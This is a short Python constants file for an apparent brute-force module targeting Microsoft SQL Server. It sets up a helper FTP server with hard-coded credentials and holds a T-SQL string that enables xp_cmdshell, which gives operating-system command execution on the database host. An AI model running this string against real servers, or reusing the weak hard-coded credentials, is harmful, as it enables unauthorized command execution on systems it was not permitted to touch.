"""Consts file for the bruteforce module"""


FTP_SERVER_PORT = 1026
FTP_SERVER_ADDRESS = ''
FTP_SERVER_USER = 'brute'
FTP_SERVER_PASSWORD = 'force'
FTP_WORKING_DIR = '.'
SQL_DEFAULT_TCP_PORT = 1433
CMDSHELL_ENABLE_STRING = """EXEC sp_configure 'show advanced options', 1;
                            RECONFIGURE;
                            EXEC sp_configure 'xp_cmdshell', 1;
                            RECONFIGURE;"""